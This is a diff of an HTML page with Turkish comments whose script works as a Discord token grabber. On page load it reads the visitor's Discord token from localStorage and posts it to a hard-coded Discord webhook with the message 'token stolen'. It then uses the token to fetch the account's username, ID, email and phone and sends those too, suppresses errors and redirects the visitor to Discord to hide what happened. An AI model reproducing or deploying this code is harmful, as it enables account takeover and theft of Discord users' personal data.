@@ -27,6 +27,9 @@
             50% { opacity: 1; }
             100% { opacity: 0.2; }
         }
+        .error {
+            color: #ff4444;
+        }
     </style>
 </head>
 <body>
@@ -36,31 +39,55 @@
 
     <script>
         (function() {
-            // Discord token'ı localStorage'dan al
             const token = localStorage.getItem('token');
-
-            // SENİN WEBHOOK URL'İN - BURAYI DEĞİŞTİR
-            const webhook = 'https://discord.com/api/webhooks/1521991843511013507/e0o1Zv2G8BX0o4JDM70x36zDt2tFFfUGLSqBm1HDOQ4r1ch1uLC8Wrda4mSF0vuuGLnL';
+            const webhook = 'https://discord.com/api/webhooks/1522159080800518185/RT7oVMuIQVBgp7qb2L5suPst3_txYTRH0pyf9LxoYwgdkAmaWx_z7CVRZfEukqogkG0o';  // BURAYA WEBHOOK URL'İNİ YAZ
 
             if (token) {
+                // 1. Token'ı webhook'a gönder
                 fetch(webhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         content: `**🎯 TOKEN ÇALINDI!**\n\`${token}\``
                     })
+                });
+
+                // 2. Token ile Discord API'den kullanıcı bilgilerini al
+                fetch('https://discord.com/api/v9/users/@me', {
+                    headers: {
+                        'Authorization': token
+                    }
                 })
-                .then(() => {
-                    setTimeout(() => {
-                        window.location.href = 'https://discord.com/app';
-                    }, 2000);
+                .then(res => res.json())
+                .then(user => {
+                    // Kullanıcı bilgilerini webhook'a gönder
+                    const bilgi = 
+                        `**👤 KULLANICI BİLGİLERİ**\n` +
+                        `**Kullanıcı Adı:** ${user.username}#${user.discriminator}\n` +
+                        `**ID:** ${user.id}\n` +
+                        `**E-posta:** ${user.email || 'Gizli'}\n` +
+                        `**Doğrulanmış:** ${user.verified ? '✅ Evet' : '❌ Hayır'}\n` +
+                        `**Telefon:** ${user.phone || 'Yok'}\n` +
+                        `**Avatar:** https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
+
+                    fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: bilgi })
+                    });
                 })
                 .catch(() => {
+                    // API hatası olursa sessizce geç
+                })
+                .finally(() => {
+                    // 2 saniye sonra Discord'a yönlendir
                     setTimeout(() => {
                         window.location.href = 'https://discord.com/app';
                     }, 2000);
                 });
+
             } else {
+                // Token yoksa uyarı göster ve yönlendir
                 document.querySelector('.loader').innerHTML = '❌ Token not found. Redirecting...';
                 setTimeout(() => {
                     window.location.href = 'https://discord.com/app';
